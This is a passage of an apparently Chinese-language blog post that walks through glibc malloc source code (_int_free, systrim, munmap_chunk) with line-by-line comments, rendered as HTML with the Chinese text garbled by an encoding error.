class="hljs-comment">/* size of previous contiguous chunk */</span><br>    mchunkptr bck;               <span class="hljs-comment">/* misc temp for linking */</span><br>    mchunkptr fwd;               <span class="hljs-comment">/* misc temp for linking */</span><br><br>    <span class="hljs-comment">// #define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br>    <span class="hljs-comment">// #define chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span><br>    <span class="hljs-comment">// #define chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span><br>    <span class="hljs-comment">// æ‹¿åˆ°å»é™¤æ ‡å¿—ä½çš„ size</span><br>    size = chunksize (p);<br><br>    <span class="hljs-comment">/* Little security check which won&#x27;t hurt performance: the</span><br><span class="hljs-comment">       allocator never wrapps around at the end of the address space.</span><br><span class="hljs-comment">       Therefore we can exclude some size values which might appear</span><br><span class="hljs-comment">       here by accident or by &quot;design&quot; from some intruder.  */</span><br>    <span class="hljs-comment">// å¦‚æœ chunk çš„æŒ‡é’ˆåœ°å€æº¢å‡º</span><br>    <span class="hljs-comment">// æˆ– chunk å¹¶æ²¡æœ‰å¯¹é½</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect((<span class="hljs-type">uintptr_t</span>) p &gt; (<span class="hljs-type">uintptr_t</span>) - size, <span class="hljs-number">0</span>)<br>        || __builtin_expect(misaligned_chunk (p), <span class="hljs-number">0</span>))<br>        malloc_printerr(<span class="hljs-string">&quot;free(): invalid pointer&quot;</span>);<br>    <span class="hljs-comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span><br><span class="hljs-comment">       multiple of MALLOC_ALIGNMENT.  */</span><br><br>    <span class="hljs-comment">// å¦‚æœ size å°äº MINSIZE</span><br>    <span class="hljs-comment">// æˆ–è€… size æ²¡æœ‰å¯¹å…¶</span><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK (size)))<br>    malloc_printerr(<span class="hljs-string">&quot;free(): invalid size&quot;</span>);<br><br>    <span class="hljs-comment">// å•¥ä¹Ÿæ²¡å¹²</span><br>    check_inuse_chunk(av, p);<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>    &#123;<br>      <span class="hljs-comment">// æ‹¿åˆ°å¯¹åº”çš„ tcache ç´¢å¼•</span><br>      <span class="hljs-type">size_t</span> tc_idx = csize2tidx (size);<br><br>      <span class="hljs-comment">// å¦‚æœå¼€å¯äº† tcache</span><br>      <span class="hljs-comment">// ä¸” ç´¢å¼•æ²¡æœ‰è¶…è¿‡å‡ºèŒƒå›´</span><br>      <span class="hljs-comment">// ä¸” å¯¹åº”çš„ tcache æœªæ»¡</span><br>      <span class="hljs-keyword">if</span> (tcache<br>      &amp;&amp; tc_idx &lt; mp_.tcache_bins<br>      &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>        &#123;<br>          <span class="hljs-comment">// å°†è¯¥ chunk æ”¾åœ¨å¯¹åº”çš„ tcache é‡Œ</span><br>          tcache_put (p, tc_idx);<br>          <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      If eligible, place chunk on a fastbin so it can be found</span><br><span class="hljs-comment">      and used quickly in malloc.</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-comment">// å¦‚æœ size åœ¨ fastbin çš„èŒƒå›´ä¹‹å†…</span><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast())<br><br>    <span class="hljs-comment">// å¦‚æœè®¾ç½®äº† TRIM_FASTBINSï¼Œä¸è¦å°†é è¿‘é¡¶éƒ¨çš„å—æ”¾å…¥ fastbins</span><br>    <span class="hljs-comment">// ä½† TRIM_FASTBINS é»˜è®¤ä¸º 0ï¼Œå³ top_chunk ä¸ä¼šåˆå¹¶ä¸å®ƒç›¸é‚»çš„ fastbin å—</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> TRIM_FASTBINS</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">      If TRIM_FASTBINS set, don&#x27;t place chunks</span><br><span class="hljs-comment">      bordering top into fastbins</span><br><span class="hljs-comment">        */</span><br>        &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>            ) &#123;<br>        <span class="hljs-comment">// æ£€æŸ¥ä¸‹ä¸€ä¸ª chunk çš„å¤§å°ï¼Œä¸èƒ½å°äº 2 * SIZE_SZ ï¼Œä¹Ÿä¸èƒ½å¤§äº av-&gt;system_mem,</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect(chunksize_nomask (chunk_at_offset(p, size))<br>                             &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>            || __builtin_expect(chunksize (chunk_at_offset(p, size))<br>                                &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>)) &#123;<br>            <span class="hljs-type">bool</span> fail = <span class="hljs-literal">true</span>;<br>            <span class="hljs-comment">/* We might not have a lock at this point and concurrent modifications</span><br><span class="hljs-comment">               of system_mem might result in a false positive.  Redo the test after</span><br><span class="hljs-comment">               getting the lock.  */</span><br>            <span class="hljs-keyword">if</span> (!have_lock) &#123;<br>                __libc_lock_lock(av-&gt;mutex);<br>                fail = (chunksize_nomask (chunk_at_offset(p, size)) &lt;= <span class="hljs-number">2</span> * SIZE_SZ<br>                        || chunksize (chunk_at_offset(p, size)) &gt;= av-&gt;system_mem);<br>                __libc_lock_unlock(av-&gt;mutex);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (fail)<br>                malloc_printerr(<span class="hljs-string">&quot;free(): invalid next size (fast)&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">// é‡Šæ”¾ä¹‹å‰å°† chunk å¡«ä¸º perturb_byte</span><br>        free_perturb(chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br>        <span class="hljs-comment">// è®¾ç«‹ have_fastchunks æ ‡å¿—ä½ï¼Œè¡¨æ˜ fastbin ä¸­æœ‰å€¼</span><br>        atomic_store_relaxed(&amp;av-&gt;have_fastchunks, <span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// æ‹¿åˆ°å¯¹åº”çš„ fastbin ç´¢å¼•</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx = fastbin_index(size);<br>        <span class="hljs-comment">// æ‹¿åˆ°ç¬¬ä¸€ä¸ªå…ƒç´ </span><br>        fb = &amp;fastbin (av, idx);<br><br>        <span class="hljs-comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span><br>        mchunkptr old = *fb, old2;<br><br>        <span class="hljs-keyword">if</span> (SINGLE_THREAD_P) &#123;<br>            <span class="hljs-comment">/* Check that the top of the bin is not the record we are going to</span><br><span class="hljs-comment">               add (i.e., double free).  */</span><br>            <span class="hljs-comment">// double free</span><br>            <span class="hljs-keyword">if</span> (__builtin_expect(old == p, <span class="hljs-number">0</span>))<br>                malloc_printerr(<span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>);<br>            <span class="hljs-comment">// å°†æ–°é‡Šæ”¾çš„ chunk æ’å…¥é“¾ä¸­</span><br>            p-&gt;fd = old;<br>            *fb = p;<br>        &#125; <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">do</span> &#123;<br>                <span class="hljs-comment">/* Check that the top of the bin is not the record we are going to</span><br><span class="hljs-comment">                   add (i.e., double free).  */</span><br>                <span class="hljs-keyword">if</span> (__builtin_expect(old == p, <span class="hljs-number">0</span>))<br>                    malloc_printerr(<span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>);<br>                p-&gt;fd = old2 = old;<br>            &#125; <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2))<br>                     != old2);<br><br>        <span class="hljs-comment">/* Check that size of fastbin chunk at the top is the same as</span><br><span class="hljs-comment">           size of the chunk that we are adding.  We can dereference OLD</span><br><span class="hljs-comment">           only if we have the lock, otherwise it might have already been</span><br><span class="hljs-comment">           allocated again.  */</span><br>        <span class="hljs-comment">// æ£€æŸ¥ è¯¥ chunk æ˜¯å¦æ”¾å¯¹äº†åœ°æ–¹</span><br>        <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span><br>            &amp;&amp; __builtin_expect(fastbin_index (chunksize(old)) != idx, <span class="hljs-number">0</span>))<br>            malloc_printerr(<span class="hljs-string">&quot;invalid fastbin entry (free)&quot;</span>);<br>    &#125;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">          Consolidate other non-mmapped chunks as they arrive.</span><br><span class="hljs-comment">        */</span><br>    <span class="hljs-comment">// size ä¸åœ¨ fastbin å†…</span><br>    <span class="hljs-comment">// chunk ä¸æ˜¯ mmap åˆ†é…çš„</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!chunk_is_mmapped(p)) &#123;<br><br>        <span class="hljs-comment">/* If we&#x27;re single-threaded, don&#x27;t lock the arena.  */</span><br>        <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>            have_lock = <span class="hljs-literal">true</span>;<br><br>        <span class="hljs-keyword">if</span> (!have_lock)<br>            __libc_lock_lock(av-&gt;mutex);<br><br>        <span class="hljs-comment">// æ‹¿åˆ°ä¸‹ä¸€ä¸ª chunk</span><br>        nextchunk = chunk_at_offset(p, size);<br><br>        <span class="hljs-comment">/* Lightweight tests: check whether the block is already the</span><br><span class="hljs-comment">           top block.  */</span><br>        <span class="hljs-comment">// å¦‚æœé‡Šæ”¾çš„ chunk æ˜¯ top_chunk</span><br>        <span class="hljs-keyword">if</span> (__glibc_unlikely(p == av-&gt;top))<br>            malloc_printerr(<span class="hljs-string">&quot;double free or corruption (top)&quot;</span>);<br>        <span class="hljs-comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span><br>        <span class="hljs-comment">// ä¸‹ä¸€ä¸ªå—è¶…å‡ºäº† arena çš„è¾¹ç•Œ</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect(contiguous (av)<br>                             &amp;&amp; (<span class="hljs-type">char</span> *) nextchunk<br>                                &gt;= ((<span class="hljs-type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="hljs-number">0</span>))<br>            malloc_printerr(<span class="hljs-string">&quot;double free or corruption (out)&quot;</span>);<br>        <span class="hljs-comment">/* Or whether the block is actually not marked used.  */</span><br>        <span class="hljs-comment">// ä¸‹ä¸€ä¸ª chunk çš„ prev_inuse æ ‡å¿—ä½ä¸º 0ï¼Œå³å‰ä¸€ä¸ª chunk å·²ç»è¢«é‡Šæ”¾è¿‡äº†</span><br>        <span class="hljs-keyword">if</span> (__glibc_unlikely(!prev_inuse(nextchunk)))<br>            malloc_printerr(<span class="hljs-string">&quot;double free or corruption (!prev)&quot;</span>);<br><br>        <span class="hljs-comment">// æ‹¿åˆ°ä¸‹ä¸€ä¸ª chunk çš„ size</span><br>        nextsize = chunksize(nextchunk);<br>        <span class="hljs-comment">// å¦‚æœ ä¸‹ä¸€ä¸ª chunk çš„ size å°äº  2 * SIZE_SZ æˆ– å¤§äº av-&gt;system_mem</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect(chunksize_nomask (nextchunk) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>            || __builtin_expect(nextsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr(<span class="hljs-string">&quot;free(): invalid next size (normal)&quot;</span>);<br>        <span class="hljs-comment">// å°†è¯¥ chunk çš„ data éƒ¨åˆ†å¡«å……ä¸º perturb_byte</span><br>        free_perturb(chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br><br>        <span class="hljs-comment">/* consolidate backward */</span><br>        <span class="hljs-comment">// å¦‚æœé‡Šæ”¾å—ä¹‹å‰çš„å—ä¹Ÿæ˜¯ free çš„</span><br>        <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>            <span class="hljs-comment">// æ‹¿åˆ°ä¸Šä¸€ä¸ª chunk çš„ size</span><br>            prevsize = prev_size (p);<br>            size += prevsize;<br>            <span class="hljs-comment">// æ‹¿åˆ°å‰ä¸€ä¸ª chunk</span><br>            p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>            <span class="hljs-comment">// å°†å‰ä¸€ä¸ª chunk å–æ¶ˆé“¾æ¥</span><br>            unlink(av, p, bck, fwd);<br>        &#125;<br>        <span class="hljs-comment">// å¦‚æœä¸‹ä¸€ä¸ª chunk ä¸ä¸º top_chunk</span><br>        <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>            <span class="hljs-comment">/* get and clear inuse bit */</span><br>            <span class="hljs-comment">// æŸ¥çœ‹ä¸‹ä¸€ä¸ª chunk æ˜¯å¦ä¸º é‡Šæ”¾çŠ¶æ€</span><br>            nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br>            <span class="hljs-comment">/* consolidate forward */</span><br>            <span class="hljs-comment">// å¦‚æœä¸‹ä¸€ä¸ª chunk ä¹Ÿæ˜¯é‡Šæ”¾çŠ¶æ€</span><br>            <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>                <span class="hljs-comment">// å°†ä¸‹ä¸€ä¸ª chunk å–æ¶ˆé“¾æ¥</span><br>                unlink(av, nextchunk, bck, fwd);<br>                size += nextsize;<br>            &#125;<br>            <span class="hljs-comment">// å¦‚æœä¸‹ä¸€ä¸ª chunk ä»å¤„äºä½¿ç”¨çŠ¶æ€</span><br>            <span class="hljs-keyword">else</span><br>                <span class="hljs-comment">// æ¸…é™¤ä¸‹ä¸€ä¸ª chunk çš„ prev_inuse ä½</span><br>                clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br><br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">          Place the chunk in unsorted chunk list. Chunks are</span><br><span class="hljs-comment">          not placed into regular bins until after they have</span><br><span class="hljs-comment">          been given one chance to be used in malloc.</span><br><span class="hljs-comment">            */</span><br>            <span class="hljs-comment">// æ‹¿åˆ° unsorter_bin</span><br>            bck = unsorted_chunks(av);<br>            <span class="hljs-comment">// æ‹¿åˆ°é“¾ä¸Šçš„ç¬¬ä¸€ä¸ª chunk</span><br>            fwd = bck-&gt;fd;<br>            <span class="hljs-comment">// æ£€æŸ¥åŒå‘é“¾æ¥å®Œæ•´æ€§</span><br>            <span class="hljs-keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))<br>                malloc_printerr(<span class="hljs-string">&quot;free(): corrupted unsorted chunks&quot;</span>);<br>            <span class="hljs-comment">// å°†é‡Šæ”¾çš„ chunk åŠ å…¥é“¾ä¸­</span><br>            p-&gt;fd = fwd;<br>            p-&gt;bk = bck;<br>            <span class="hljs-comment">// å¦‚æœ size åœ¨ lage_bin çš„èŒƒå›´ä¹‹ä¸­</span><br>            <span class="hljs-comment">// æ¸…é™¤ nextsize åŸŸ</span><br>            <span class="hljs-keyword">if</span> (!in_smallbin_range(size)) &#123;<br>                p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>            &#125;<br>            <span class="hljs-comment">// å®Œæˆé“¾æ¥</span><br>            bck-&gt;fd = p;<br>            fwd-&gt;bk = p;<br>            <span class="hljs-comment">// è®¾ç«‹ æ ‡å¿—ä½</span><br>            set_head(p, size | PREV_INUSE);<br>            set_foot(p, size);<br><br>            <span class="hljs-comment">// å•¥ä¹Ÿæ²¡å¹²</span><br>            check_free_chunk(av, p);<br>        &#125;<br><br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">              If the chunk borders the current high end of memory,</span><br><span class="hljs-comment">              consolidate into top</span><br><span class="hljs-comment">            */</span><br>        <span class="hljs-comment">// ä¸ top_chunk è¿›è¡Œåˆå¹¶</span><br>        <span class="hljs-keyword">else</span> &#123;<br>            size += nextsize;<br>            set_head(p, size | PREV_INUSE);<br>            av-&gt;top = p;<br>            check_chunk(av, p);<br>        &#125;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">          If freeing a large space, consolidate possibly-surrounding</span><br><span class="hljs-comment">          chunks. Then, if the total unused topmost memory exceeds trim</span><br><span class="hljs-comment">          threshold, ask malloc_trim to reduce top.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          Unless max_fast is 0, we don&#x27;t know if there are fastbins</span><br><span class="hljs-comment">          bordering top, so we cannot tell for sure whether threshold</span><br><span class="hljs-comment">          has been reached unless fastbins are consolidated.  But we</span><br><span class="hljs-comment">          don&#x27;t want to consolidate on each free.  As a compromise,</span><br><span class="hljs-comment">          consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span><br><span class="hljs-comment">          is reached.</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-comment">// å¦‚æœ size å¤§äº FASTBIN_CONSOLIDATION_THRESHOLD</span><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;<br>            <span class="hljs-comment">// å¦‚æœ fastbin ä¸­æœ‰ç©ºé—²çš„ chunk</span><br>            <span class="hljs-keyword">if</span> (atomic_load_relaxed(&amp;av-&gt;have_fastchunks))<br>                <span class="hljs-comment">// è§¦å‘ malloc_consolidate</span><br>                malloc_consolidate(av);<br>            <span class="hljs-comment">// å¦‚æœæ­¤æ—¶çš„ arena ä¸º main_arena</span><br>            <span class="hljs-keyword">if</span> (av == &amp;main_arena) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span><br>                <span class="hljs-comment">// å¦‚æœ top_chunk çš„ size å¤§äº heapçš„æ”¶ç¼©é˜ˆå€¼</span><br>                <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (chunksize(av-&gt;top)) &gt;=<br>                    (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (mp_.trim_threshold))<br>                    systrim(mp_.top_pad, av);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">/* Always try heap_trim(), even if the top chunk is not</span><br><span class="hljs-comment">                   large, because the corresponding heap might go away.  */</span><br>                <span class="hljs-comment">// æ”¶ç¼©éä¸»åˆ†é…åŒº</span><br>                heap_info *heap = heap_for_ptr(top(av));<br><br>                assert(heap-&gt;ar_ptr == av);<br>                heap_trim(heap, mp_.top_pad);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!have_lock)<br>            __libc_lock_unlock(av-&gt;mutex);<br>    &#125;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">          If the chunk was allocated via mmap, release via munmap().</span><br><span class="hljs-comment">        */</span><br>    <span class="hljs-comment">// è¯¥ chunk æ˜¯ mmap åˆ†é…çš„</span><br>    <span class="hljs-keyword">else</span> &#123;<br>        munmap_chunk(p);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="systrim"><a href="#systrim" class="headerlink" title="systrim"></a>systrim</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   systrim is an inverse of sorts to sysmalloc.  It gives memory back</span><br><span class="hljs-comment">   to the system (via negative arguments to sbrk) if there is unused</span><br><span class="hljs-comment">   memory at the `high&#x27; end of the malloc pool. It is called</span><br><span class="hljs-comment">   automatically by free() when top space exceeds the trim</span><br><span class="hljs-comment">   threshold. It is also called by the public malloc_trim routine.  It</span><br><span class="hljs-comment">   returns 1 if it actually released any memory, else 0.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">systrim</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pad, mstate av)</span> &#123;<br>    <span class="hljs-type">long</span> top_size;         <span class="hljs-comment">/* Amount of top-most memory */</span><br>    <span class="hljs-type">long</span> extra;            <span class="hljs-comment">/* Amount to release */</span><br>    <span class="hljs-type">long</span> released;         <span class="hljs-comment">/* Amount actually released */</span><br>    <span class="hljs-type">char</span> *current_brk;     <span class="hljs-comment">/* address returned by pre-check sbrk call */</span><br>    <span class="hljs-type">char</span> *new_brk;         <span class="hljs-comment">/* address returned by post-check sbrk call */</span><br>    <span class="hljs-type">size_t</span> pagesize;<br>    <span class="hljs-type">long</span> top_area;<br><br>    pagesize = GLRO(dl_pagesize);<br>    top_size = chunksize (av-&gt;top);<br><br>    top_area = top_size - MINSIZE <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">if</span> (top_area &lt;= pad)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* Release in pagesize units and round down to the nearest page.  */</span><br>    extra = ALIGN_DOWN(top_area - pad, pagesize);<br><br>    <span class="hljs-keyword">if</span> (extra == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">       Only proceed if end of memory is where we last set it.</span><br><span class="hljs-comment">       This avoids problems if there were foreign sbrk calls.</span><br><span class="hljs-comment">     */</span><br>    current_brk = (<span class="hljs-type">char</span> *) (MORECORE(<span class="hljs-number">0</span>));<br>    <span class="hljs-keyword">if</span> (current_brk == (<span class="hljs-type">char</span> *) (av-&gt;top) + top_size) &#123;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">           Attempt to release memory. We ignore MORECORE return value,</span><br><span class="hljs-comment">           and instead call again to find out where new end of memory is.</span><br><span class="hljs-comment">           This avoids problems if first call releases less than we asked,</span><br><span class="hljs-comment">           of if failure somehow altered brk value. (We could still</span><br><span class="hljs-comment">           encounter problems if it altered brk in some very bad way,</span><br><span class="hljs-comment">           but the only thing we can do is adjust anyway, which will cause</span><br><span class="hljs-comment">           some downstream failure.)</span><br><span class="hljs-comment">         */</span><br><br>        MORECORE(-extra);<br>        <span class="hljs-comment">/* Call the `morecore&#x27; hook if necessary.  */</span><br>        <span class="hljs-type">void</span> (*hook)(<span class="hljs-type">void</span>) = atomic_forced_read(__after_morecore_hook);<br>        <span class="hljs-keyword">if</span> (__builtin_expect(hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>            (*hook)();<br>        new_brk = (<span class="hljs-type">char</span> *) (MORECORE(<span class="hljs-number">0</span>));<br><br>        LIBC_PROBE(memory_sbrk_less, <span class="hljs-number">2</span>, new_brk, extra);<br><br>        <span class="hljs-keyword">if</span> (new_brk != (<span class="hljs-type">char</span> *) MORECORE_FAILURE) &#123;<br>            released = (<span class="hljs-type">long</span>) (current_brk - new_brk);<br><br>            <span class="hljs-keyword">if</span> (released != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">/* Success. Adjust top. */</span><br>                av-&gt;system_mem -= released;<br>                set_head (av-&gt;top, (top_size - released) | PREV_INUSE);<br>                check_malloc_state (av);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="munmap-chunk"><a href="#munmap-chunk" class="headerlink" title="munmap_chunk"></a>munmap_chunk</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">munmap_chunk</span><span class="hljs-params">(mchunkptr p)</span> &#123;<br>    INTERNAL_SIZE_T size = chunksize (p);<br><br>    assert(chunk_is_mmapped (p));<br><br>    <span class="hljs-comment">/* Do nothing if the chunk is a faked mmapped chunk in the dumped</span><br><span class="hljs-comment">       main arena.  We never free this memory.  */</span><br>    <span class="hljs-keyword">if</span> (DUMPED_MAIN_ARENA_CHUNK (p))<br>        <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-type">uintptr_t</span> block = (<span class="hljs-type">uintptr_t</span>) p - prev_size (p);<br>    <span class="hljs-type">size_t</span> total_size = prev_size (p) + size;<br>    <span class="hljs-comment">/* Unfortunately we have to do the compilers job by hand here.  Normally</span><br><span class="hljs-comment">       we would test BLOCK and TOTAL-SIZE separately for compliance with the</span><br><span class="hljs-comment">       page size.  But gcc does not recognize the optimization possibility</span><br><span class="hljs-comment">       (in the moment at least) so we combine the two values into one before</span><br><span class="hljs-comment">       the bit test.  */</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect(((block | total_size) &amp; (GLRO(dl_pagesize) - <span class="hljs-number">1</span>)) != <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br>        malloc_printerr(<span class="hljs-string">&quot;munmap_chunk(): invalid pointer&quot;</span>);<br><br>    atomic_decrement(&amp;mp_.n_mmaps);<br>    <span class="hljs-type">atomic_add</span>(&amp;mp_.mmapped_mem, -total_size);<br><br>    <span class="hljs-comment">/* If munmap failed the process virtual memory address space is in a</span><br><span class="hljs-comment">       bad shape.  Just leave the block hanging around, the process will</span><br><span class="hljs-comment">       terminate shortly anyway since not much can be done.  */</span><br>    __munmap((<span class="hljs-type">char</span> *) block, total_size);<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span 